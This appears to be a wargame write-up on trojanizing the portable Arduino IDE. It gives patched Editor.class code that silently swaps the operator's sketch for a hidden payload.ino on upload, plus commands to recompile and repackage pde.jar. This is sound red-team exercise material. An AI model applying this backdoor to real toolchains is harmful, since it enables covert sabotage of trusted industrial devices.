I'm going to show you why being able to patch an app can be an essential skill for red teaming.

# CONTEXT

I had the chance to attend the Cyber Humanum Est, which is a wargame organized by the French military and a university.
In order to perform an attack like "Stuxnet", we were asked to find a way to hijack the code of an industrial robot (simulated with Arduino).
We could get the source code of this robot, but the admin mentioned that we cannot apply any modification to it...

When our payload is ready, we will get 2/3 minutes in order to install our attack, and then the operator clicks on "upload".

# The Target: why hijack the code when we can hijack the IDE?

So we know for a fact that we cannot modify the code that will be uploaded by the operator directly... However, we got this code and we can still alter it in order to prepare our attack. The main issue is: how can we apply our malicious code if we cannot upload it directly? Simple: make sure that the IDE applies the payload we created no matter what the operator writes in his code and clicks on upload!

# Hijack of Arduino IDE portable version: The recon

I downloaded the portable version of Arduino and started looking for useful functions with `jd-gui`.
After some research, I found this: `arduino-1.8.19/lib/pde.jar`.
This .jar contains a lot of useful classes, and one of them was the target.
Located in `processing.app`, `Editor.class` managed some useful functions on the IDE (like selecting a board...) but it also managed the Upload button!
I also know that when we upload an Arduino code, it saves an .ino file of our code... then I got an idea...

What if we hide a malicious .ino into the files of the IDE and make sure that no matter what the user writes or does in his IDE, it always uploads our .ino file and not the saved one! This would allow us to install a corrupted version of the IDE on the target and, no matter what the operator does, the attack will succeed!

After digging into Editor:

```java
  class UploadHandler implements Runnable {
    boolean usingProgrammer = false;
    
    public void setUsingProgrammer(boolean usingProgrammer) {
      this.usingProgrammer = usingProgrammer;
    }
    
    public void run() {
      try {
        Editor.uploading = true;
        Editor.this.removeAllLineHighlights();
        if (Editor.serialMonitor != null)
          Editor.serialMonitor.suspend(); 
        if (Editor.serialPlotter != null)
          Editor.serialPlotter.suspend(); 
        boolean success = Editor.this.sketchController.exportApplet(this.usingProgrammer);
        if (success)
          Editor.this.statusNotice(I18n.tr("Done uploading.")); 
      } catch (SerialNotFoundException e) {
        if (Editor.portMenu.getItemCount() == 0) {
          Editor.this.statusError(I18n.tr("Serial port not selected."));
        } else if (Editor.this.serialPrompt()) {
          run();
        } else {
          Editor.this.statusNotice(I18n.tr("Upload canceled."));
        } 
      } catch (PreferencesMapException e) {
        Editor.this.statusError(I18n.format(
              I18n.tr("Error while uploading: missing '{0}' configuration parameter"), new Object[] { e
                .getMessage() }));
      } catch (RunnerException e) {
        Editor.this.status.unprogress();
        Editor.this.statusError((Exception)e);
      } catch (Exception e) {
        e.printStackTrace();
      } finally {
        Editor.this.populatePortMenu();
        Editor.avoidMultipleOperations = false;
      } 
      Editor.this.status.unprogress();
      Editor.uploading = false;
      Editor.this.toolbar.deactivateExport();
      Editor.this.resumeOrCloseSerialMonitor();
      Editor.this.resumeOrCloseSerialPlotter();
      Editor.this.base.onBoardOrPortChange();
    }
  }
  
  public static boolean isUploading() {
    return uploading;
  }

```

Now this is interesting! `boolean success = Editor.this.sketchController.exportApplet(this.usingProgrammer)`

This leads us to the Sketch object. This object knows the path of the .ino file saved on the disk.

`exportApplet` calls `arduino-builder` with the path of the .ino file saved.

But! The IDE thinks that the file saved is the same thing that is appearing on the IDE. If we modify this file just before this call, the IDE will upload our payload without changing the code that is written on the IDE! (The operator would need to reopen the original file in order to detect it!)

Let's exploit this!

# Hijack of Arduino IDE portable version: The exploit

We need to unjar the `pde.jar`:

`unzip pde.jar -d pde_extracted`

Then we go into `pde_extracted/processing/app/Editor.class` and we exploit:

```java
/* 2043 */   class UploadHandler implements Runnable {
/* 2044 */     boolean usingProgrammer = false;
/* */     
/* */     public void setUsingProgrammer(boolean usingProgrammer) {
/* 2046 */       this.usingProgrammer = usingProgrammer;
/* */     }
/* */     
/* */     public void run() {
/* */       try {
/* */         // --- INJECTION of payload.ino ---
/* */         try {
/* */           String root = System.getProperty("user.dir");
/* */           java.io.File payload = new java.io.File(root, "hardware/payload.ino");
/* */           if (payload.exists()) {
/* */             Editor.this.statusNotice("ZEROZ - INJECTING..."); // This is just for the troll lol
/* */             java.nio.file.Path dest = Editor.this.sketch.getPrimaryFile().getFile().toPath();
/* */             java.nio.file.Files.copy(payload.toPath(), dest, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
/* */           }
/* */         } catch (Exception e) { }
/* */         // -------------------------
/* */
/* 2051 */         Editor.uploading = true;
/* 2053 */         Editor.this.removeAllLineHighlights();
/* 2054 */         if (Editor.serialMonitor != null) Editor.serialMonitor.suspend();
/* 2057 */         if (Editor.serialPlotter != null) Editor.serialPlotter.suspend();
/* */         
/* 2061 */         boolean success = Editor.this.sketchController.exportApplet(this.usingProgrammer);
/* 2062 */         if (success) {
/* 2063 */           Editor.this.statusNotice(I18n.tr("Done uploading."));
/* */         }
/* 2065 */       } catch (SerialNotFoundException e) {
/* 2066 */         if (Editor.portMenu.getItemCount() == 0) {
/* 2067 */           Editor.this.statusError(I18n.tr("Serial port not selected."));
/* 2069 */         } else if (Editor.this.serialPrompt()) {
/* 2070 */           run();
/* 2071 */         } else {
/* 2072 */           Editor.this.statusNotice(I18n.tr("Upload canceled."));
/* */         }
/* 2075 */       } catch (PreferencesMapException e) {
/* 2076 */         Editor.this.statusError(I18n.format(I18n.tr("Error while uploading: missing '{0}' configuration parameter"), new Object[] { e.getMessage() }));
/* 2079 */       } catch (RunnerException e) {
/* 2082 */         Editor.this.status.unprogress();
/* 2083 */         Editor.this.statusError((Exception)e);
/* 2084 */       } catch (Exception e) {
/* 2085 */         e.printStackTrace();
/* */       } finally {
/* 2087 */         Editor.this.populatePortMenu();
/* 2088 */         Editor.avoidMultipleOperations = false;
/* */       } 
/* 2090 */       Editor.this.status.unprogress();
/* 2091 */       Editor.uploading = false;
/* 2093 */       Editor.this.toolbar.deactivateExport();
/* 2095 */       Editor.this.resumeOrCloseSerialMonitor();
/* 2096 */       Editor.this.resumeOrCloseSerialPlotter();
/* 2097 */       Editor.this.base.onBoardOrPortChange();
/* */     }
/* */   }
/* */   
/* */   public static boolean isUploading() {
/* 2102 */     return uploading;
/* */   }

```

Allow me to explain:

Since we use the portable version, we set the root path: `String root = System.getProperty("user.dir");`

Then we catch our payload: `java.io.File payload = new java.io.File(root, "hardware/payload.ino");`

We locate the .ino file that was saved by the operator when clicking upload: `java.nio.file.Path dest = Editor.this.sketch.getPrimaryFile().getFile().toPath();`

We replace the saved file with our malicious one: `java.nio.file.Files.copy(payload.toPath(), dest, java.nio.file.StandardCopyOption.REPLACE_EXISTING);`

And we continue normal execution!

We might need to debug some other functions (for me, I need to clean this):

```java
private void handleBurnBootloader() {
    this.console.clear();
    EditorConsole.setCurrentEditorConsole(this.console);
    statusNotice(I18n.tr("Burning bootloader to I/O Board (this may take a minute)..."));
    (new Thread(() -> {
          try {
            SerialUploader serialUploader = new SerialUploader();
            if (serialUploader.burnBootloader()) {
              SwingUtilities.invokeLater(() -> {});
            } else {
              SwingUtilities.invokeLater(() -> {});
            } 
          } catch (SerialNotFoundException e) {
            SwingUtilities.invokeLater(() -> {});
          } catch (PreferencesMapException e) {
            SwingUtilities.invokeLater(() -> {});
          } catch (RunnerException e) {
            SwingUtilities.invokeLater(() -> {});
          } catch (Exception e) {
            SwingUtilities.invokeLater(() -> {});
            e.printStackTrace();
          } 
        })).start();
  }

```

We also need to add this: `import java.nio.file.*;`

Now we need to compile this class and inject it!

# Hijack of Arduino IDE portable version: The compilation

We use the portable version in order to compile everything.

Launch this command from `arduino-1.8.19`: `javac -target 1.8 -source 1.8 -cp "lib/pde.jar:lib/arduino-core.jar:lib/*" ../pde_extracted/processing/app/Editor.java`

This will generate .class files; we will inject them into the `pde.jar`: `zip -u lib/pde.jar processing/app/Editor*.class`

Now when we launch the IDE in portable version, no matter what we write in it, **the payload.ino will be uploaded into the Arduino.**

# CONCLUSION

This can be one use of patched application in order to do red teaming operation, if you can't hack someone directly, hijack something he trust.